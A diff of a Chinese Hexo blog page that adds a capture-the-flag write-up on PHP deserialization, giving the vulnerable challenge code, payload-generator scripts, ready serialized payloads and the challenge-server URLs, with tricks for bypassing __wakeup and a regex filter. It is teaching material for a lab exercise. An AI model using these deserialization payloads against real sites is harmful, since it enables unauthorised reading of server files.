@@ -147,6 +147,67 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/06/2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lgq">
+      <meta itemprop="description" content="欢迎浏览， 请多多指教">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of lgq">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/11/06/2/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-11-06 15:31:53 / 修改时间：15:32:39" itemprop="dateCreated datePublished" datetime="2020-11-06T15:31:53+08:00">2020-11-06</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <hr>
+<h2 id="title：-实验"><a href="#title：-实验" class="headerlink" title="title： 实验 "></a>title： 实验 </h2>
+      
+    </div>
+
+    
+    
+    
+
+ 
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/05/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -170,10 +231,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-11-05 23:08:05 / 修改时间：23:13:01" itemprop="dateCreated datePublished" datetime="2020-11-05T23:08:05+08:00">2020-11-05</time>
+              <time title="创建时间：2020-11-05 23:08:05" itemprop="dateCreated datePublished" datetime="2020-11-05T23:08:05+08:00">2020-11-05</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-06 15:36:31" itemprop="dateModified" datetime="2020-11-06T15:36:31+08:00">2020-11-06</time>
+              </span>
 
           
 
@@ -190,15 +257,86 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    class XianZhi&#123;</span><br><span class="line">        public $name;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">          echo file_get_contents($this-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unserialize($_GET[&#39;a&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h2><p>将上面代码改为如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class XianZhi&#123;</span><br><span class="line">        public $name;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">          echo file_get_contents($this-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new XianZhi();</span><br><span class="line">$a-&gt;name&#x3D;&quot;&#x2F;flag&quot;;</span><br><span class="line">echo serialize($a);    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者可以将代码改写成：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class XianZhi&#123;</span><br><span class="line">        public $name&#x3D;&quot;&#x2F;flag&quot;;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">          echo file_get_contents($this-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new XianZhi();</span><br><span class="line">echo serialize($a);    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>然后再运行代码就会获得纰漏O:7:”XianZhi”:1:{s:4:”name”;s:5:”/flag”;}，然后再用get的方式传进去就可以夺旗了，这个旗是包含flag的。</p>
-<p>用get的方式传进去就是在地址栏上输入/?a=O:7:”XianZhi”:1:{s:4:”name”;s:5:”/flag”;}；</p>
-<p>类：函数的集合。</p>
-<p>__destruct()：构造方法 ，这个类序列化结束后会调用的一个方法。</p>
-<p>file_get_contents函数作用：打开一个文件，可以打开一个远程文件</p>
-<p>类里面的变量称为属性，类里面的函数称之为方法；</p>
-<h1 id="设置Sublime软件中可以运行代码"><a href="#设置Sublime软件中可以运行代码" class="headerlink" title="设置Sublime软件中可以运行代码"></a>设置Sublime软件中可以运行代码</h1><p>一，打开平时所用的php版本根目录，并复制此地址；例如：D:\phpStudy\PHPTutorial\php\php-5.4.45-nts</p>
+<p>然后再运行代码就会获得payload：O:7:”XianZhi”:1:{s:4:”name”;s:5:”/flag”;}，然后再用get的方式传进去就可以夺旗了，这个旗是包含flag的,不可以漏掉。</p>
+<p>用get的方式传进去就是在地址栏上输入：</p>
+<p>47.98.234.232:28032/?a=O:7:”XianZhi”:1:{s:4:”name”;s:5:”/flag”;}</p>
+<h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>这行代码是显示源码的意思；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<p>没有XianZhi对象我们可以new一个XianZhi对象出来然后再将对象赋值给一个变量，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; new XianZhi()；</span><br></pre></td></tr></table></figure>
+
+<p>非常典型的一个反序列函数，通过get的方式传进来；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize($_GET[&#39;a&#39;]);</span><br></pre></td></tr></table></figure>
+
+<p>将对象给序列化成字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>而有file_get_contents函数就有了访问服务器内网的方式，我们就可以通过控制name属性来访问flag文件啦，具体操作如上解题方法。</p>
+<h1 id="unserialize2"><a href="#unserialize2" class="headerlink" title="unserialize2"></a>unserialize2</h1><p>题目代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo &#123;</span><br><span class="line">    private $file &#x3D; &#39;index.php&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file &#x3D; $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        echo @highlight_file($this-&gt;file, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup() &#123;</span><br><span class="line">        if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123;</span><br><span class="line">            &#x2F;&#x2F;the secret is in the f15g_1s_here.php</span><br><span class="line">            $this-&gt;file &#x3D; &#39;index.php&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;var&#39;])) &#123;</span><br><span class="line">    $var &#x3D; base64_decode($_GET[&#39;var&#39;]);</span><br><span class="line">    if (preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $var)) &#123;</span><br><span class="line">        die(&#39;stop hacking!&#39;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize($var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(&quot;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<h2 id="解题方法-1"><a href="#解题方法-1" class="headerlink" title="解题方法"></a>解题方法</h2><p>将代码改为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo &#123;</span><br><span class="line">    private $file &#x3D; &#39;index.php&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file &#x3D; $file;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;    </span><br><span class="line">$a &#x3D; new Demo(&quot;f15g_1s_here.php&quot;);</span><br><span class="line">$payload &#x3D; serialize($a);</span><br><span class="line">$payload &#x3D; str_replace(&#39;:4&#39;, &quot;:+4&quot;, $payload);</span><br><span class="line">$payload &#x3D; str_replace(&#39;:1:&#39;, &quot;:+2:&quot;, $payload);</span><br><span class="line">echo base64_encode($payload);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>运行程序得到payload：TzorNDoiRGVtbyI6KzI6e3M6MTA6IgBEZW1vAGZpbGUiO3M6MTY6ImYxNWdfMXNfaGVyZS5waHAiO30=</p>
+<p>再有get方式上传，在地址栏上输入 47.98.234.232:28067/var=TzorNDoiRGVtbyI6KzI6e3M6MTA6IgBEZW1vAGZpbGUiO3M6MTY6ImYxNWdfMXNfaGVyZS5waHAiO30=</p>
+<p>访问即可夺旗</p>
+<h2 id="题目解析-1"><a href="#题目解析-1" class="headerlink" title="题目解析"></a>题目解析</h2><p>访问源码的意思；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&quot;index.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>_wakeup的作用是使用反序列函数时触发，也就是说当我们使用反序列化时就会直接运行下面的代码，如果说这个file属性这个值不是index就会强行转换为index这个值；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function __wakeup() &#123;</span><br><span class="line">        if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123;</span><br><span class="line">            &#x2F;&#x2F;the secret is in the f15g_1s_here.php</span><br><span class="line">            $this-&gt;file &#x3D; &#39;index.php&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>对我们传进来的东西进行了过滤，我们传进来的东西必须要被base64编码的；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#39;var&#39;])) &#123;</span><br><span class="line">    $var &#x3D; base64_decode($_GET[&#39;var&#39;]);</span><br></pre></td></tr></table></figure>
+
+<p>对我们传进来的内容进行了正则匹配过滤；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $var))</span><br></pre></td></tr></table></figure>
+
+<p> 初始化我们的类file，然后我们就可以对类file进行赋值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function __construct($file)</span><br></pre></td></tr></table></figure>
+
+<p>将对象Demo赋值给变量$a</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; new Demo(&quot;f15g_1s_here.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>将对象字符串化再赋值给变量$payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>为了绕过正则匹配和_wake，第一行是将正则匹配的东西给替换从而绕过，第二行是再次替换，利用php5.5之前的漏洞当我们序列化的对象里面的属性大于它真实的值的时候它会绕过wake去执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; str_replace(&#39;:4&#39;, &quot;:+4&quot;, $payload);</span><br><span class="line">$payload &#x3D; str_replace(&#39;:1:&#39;, &quot;:+2:&quot;, $payload);</span><br></pre></td></tr></table></figure>
+
+<p>输出变量$payload并对它进行base64编码；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo base64_encode($payload);</span><br></pre></td></tr></table></figure>
+
+<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>题目代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op &#x3D; &quot;1&quot;;</span><br><span class="line">        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;</span><br><span class="line">        $content &#x3D; &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();       </span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res &#x3D; &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res &#x3D; file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str &#x3D; (string)$_GET[&#39;str&#39;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj &#x3D; unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解题方法-2"><a href="#解题方法-2" class="headerlink" title="解题方法"></a>解题方法</h2><p>将代码改为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op&#x3D;2;</span><br><span class="line">    protected $filename&#x3D;&quot;&#x2F;flag&quot;;</span><br><span class="line">    protected $content&#x3D;1;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo  serialize(new FileHandler);</span><br></pre></td></tr></table></figure>
+
+<p>就会得到一个带有不可见字符的payload，将该payload中的不可见字符改成\00，即如下：</p>
+<p>O:11:”FileHandler”:3:{S:5:”\00<em>\00op”;i:2;S:11:”\00</em>\00filename”;S:5:”/flag”;s:10:”\00*\00content”;i:1;}</p>
+<p>然后再用get方式传输，即可夺旗；</p>
+<h2 id="题目解析-2"><a href="#题目解析-2" class="headerlink" title="题目解析"></a>题目解析</h2><p>查看源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<p>如果op等于2就会强制转化成1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>如果/flag被过滤了，我们可以用16进制来代替它；</p>
+<p>在sublime软件中输入代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> echo bin2hex(&#39;&#x2F;flag&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>即可获得flag的十六进制2f666c6167，</p>
+<p>然后再将payload改成：</p>
+<p>O:11:”FileHandler”:3:{S:5:”\00<em>\00op”;i:2;S:11:”\00</em>\00filename”;S:5:”\2f\66\6c\61\67”;s:10:”\00*\00content”;i:1;}即可；</p>
+<h1 id="解题中的知识"><a href="#解题中的知识" class="headerlink" title="解题中的知识"></a>解题中的知识</h1><h2 id="设置Sublime软件中可以运行代码"><a href="#设置Sublime软件中可以运行代码" class="headerlink" title="设置Sublime软件中可以运行代码"></a>设置Sublime软件中可以运行代码</h2><p>一，打开平时所用的php版本根目录，并复制此地址；例如：D:\phpStudy\PHPTutorial\php\php-5.4.45-nts</p>
 <p><img src="https://i.loli.net/2020/11/05/qCQgokfKpHBE5Pr.png" alt="1604568992092.png"></p>
 <p>二，右击此电脑，打开属性，点击高级系统设置，打开环境变量，点击系统变量的path变量将上一步复制的地址写进去；</p>
 <p><img src="https://i.loli.net/2020/11/05/JfgkMBQZWb5p89i.png" alt="1604569106085.png"></p>
@@ -207,7 +345,14 @@
 
 <p><img src="https://i.loli.net/2020/11/05/avUcOojmYsw4IRD.png" alt="1604569143047.png"></p>
 <p>四，保存该文件，命名为PHP5.sublime-build，我们就可以通过按ctrl+b运行代码了。</p>
-<p><img src="https://i.loli.net/2020/11/05/Gql1yTXQRC7Jxjd.png" alt="1604569007941.png"></p>
+<p><img src="https://i.loli.net/2020/11/06/xl1D5rSfYq2RbnM.png" alt="1604569007941.png"></p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>类：函数的集合。</p>
+<p>file_get_contents函数作用：打开一个文件，可以打开一个远程文件，是ssrf漏洞的典型特征；</p>
+<p>类里面的变量称为属性，类里面的函数称之为方法；</p>
+<p>在php中两个等号只会比较数值是否相等，而三个等号是会比较数据类型是否相等；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(1 &#x3D;&#x3D;&quot;1&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>两个等号会相等，三个等号就不相等了，因为一个是int类型一个是字符串类型，类型不一样所以不相等；</p>
 
       
     </div>
@@ -1045,7 +1190,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1115,7 +1260,7 @@ $(document).ready(function() {
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共4.8k字</span>
+  <span class="post-count">博客全站共6.2k字</span>
 </div>
 
         
